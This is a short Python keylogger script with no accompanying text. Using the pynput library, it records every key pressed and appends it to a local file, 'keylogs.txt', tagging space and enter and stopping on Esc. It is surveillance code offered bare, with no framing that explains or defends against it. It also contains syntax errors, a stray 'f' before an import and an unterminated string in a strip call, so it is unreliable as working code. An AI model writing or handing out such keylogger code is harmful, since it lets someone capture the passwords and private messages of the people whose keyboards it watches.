import pynput

f from pynput.keyboard import Listener, Key

def on_press(key):
    with open('keylogs.txt', 'a') as f:
        try:
            char = str(key).strip("'})
            if len(char) == 1:
                f.write(char)
            elif key in [Key.space, Key.enter]:
                special_keys = {Key.space: '[SPACE]', Key.enter: '[ENTER]'}
                f.write(special_keys[key])
            else:
                f.write(' [{}]'.format(char)) 
        except Exception as e:
            print(e)
def on_release(key):
    if key == Key.esc:
        return False
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
